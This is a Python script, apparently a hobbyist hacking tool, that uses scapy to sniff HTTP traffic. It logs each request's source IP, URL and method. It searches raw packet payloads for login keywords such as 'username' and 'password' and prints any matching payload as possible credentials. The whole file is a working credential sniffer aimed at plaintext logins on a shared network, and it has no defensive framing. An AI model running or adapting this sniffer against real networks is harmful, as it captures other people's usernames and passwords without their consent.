import scapy.all as scapy
from scapy.layers.http import HTTPRequest  # import HTTP packet
from scapy.layers.inet import IP #import IP altough not necessary.
from colorama import init, Fore
# initialize colorama
init()
# define colors
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
RESET = Fore.RESET

class Sniffer():

    def __init__(self):
        self.sniff_packets()

    def sniff_packets(self): #main function for sniffing.
        scapy.sniff(prn=self.process_sniffed_packet, store=False) #using scapy.sniff() to sniff the packets, creates a packet by name of packet, prn is callback function to process sniffed packets.

    def get_url(self, packet): # to get url from packet
        if packet.haslayer(HTTPRequest):
            url = packet[HTTPRequest].Host + packet[HTTPRequest].Path # combining the Host or domain name with the path.
            return url

    def get_ip(self, packet): # to get source IP from packet
        if packet.haslayer(HTTPRequest):
            ip = packet[IP].src
            return ip
            
    def get_method(self, packet): # to get request method from packet.
        if packet.haslayer(HTTPRequest):
            method = packet[HTTPRequest].Method.decode()
            return method

    def get_login_info(self, packet): # to get possibly login related info.
        keywords = ["username", "uname", "pass","password","login","user"] #keywords frequently used with login forms.
        if packet.haslayer(HTTPRequest):
            if packet.haslayer(scapy.Raw): # load is usually carried in Raw portion of packets.
                load = str(packet[scapy.Raw].load) 
                for keyword in keywords:
                    if keyword in load:
                        return load

    def process_sniffed_packet(self, packet): #callback function mentioned above.
        url = self.get_url(packet)
        login_info = self.get_login_info(packet)
        ip = self.get_ip(packet)
        method = self.get_method(packet)

        if url and ip and method:
            print(f"[+] {RED}{ip}{RESET} Requested {RED}{url}{RESET} with {RED}{method}{RESET}")
        if url and ip and method == "POST":
            print(f"[+] {RED}{ip}{RESET} Requested {RED}{url}{RESET} with {BLUE}{method}{RESET}")
        if login_info:
            print(f"\n[+] Possible Username/Password {RED}{login_info}{RESET}\n")
        

if __name__ == "__main__":
    try:
        S = Sniffer()
    except KeyboardInterrupt:
        print("[-] Keyboard Interuppted..... EXITING!!")
